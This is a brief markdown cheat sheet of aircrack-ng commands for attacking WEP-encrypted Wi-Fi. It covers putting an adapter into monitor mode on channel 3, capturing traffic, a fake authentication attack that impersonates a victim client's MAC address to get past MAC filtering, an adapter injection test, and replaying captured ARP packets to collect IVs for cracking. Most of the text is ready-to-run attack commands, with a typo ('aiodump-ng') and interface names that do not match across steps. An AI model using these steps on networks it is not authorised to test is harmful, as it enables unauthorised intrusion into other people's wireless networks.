# Fake authentication attack \(MAC association\)

* On router running with WEP encryption and transmit in channel 3
* On Kali

  ```bash
  # start monitor in channel 3
  airmon-ng start wlan0 3

  # save capture file to disk - breaking it later (let it run)
  aiodump-ng -c 3 --essid <SSID NAME> -w wepfile1 mon0

  # perform fake authentication attack - on new terminal
  ## Authenticate my mac address to accesspoint (else traffic will be rejected)
  # -1 fake auth attack
  # 0 association timing in seconds
  aireplay-ng -1 0 -e <essid> -a <mac_addr> -h <own-mac> mon0


  # view the packets (total 4 of them in the fake authentication of mac to accesspoint)
  wireshark wepfile1
  ```

  In a possible attack scenario, where an AP has MAC address filtering. We need to first obtain a valid mac address of a client, then wait until the client is no longer on the network and impersonate the client by performing fake authentication attack to associate our attacking machine with the victim access point.

# Injection Test

Output will show if all the tests passed and that current adapter can be used for injection \(for use with WEP attacks\)

```bash
aireplay-ng -9 -i wlan1 mon0
```

# Re-using captured ARP replay packets

Reusing the captured ARP packet to get IV data. The file name 'replay\_src-xxx.xxxx.cap' can be re-used. Type 'y' when prompted to use the packet and start seeing the count under 'data' in your airmon-ng monitor screen grow rapidly as IV data are being collected.

```bash
aireplay-ng -2 -r replay_src-0129-223530.cap wlan0mon

```
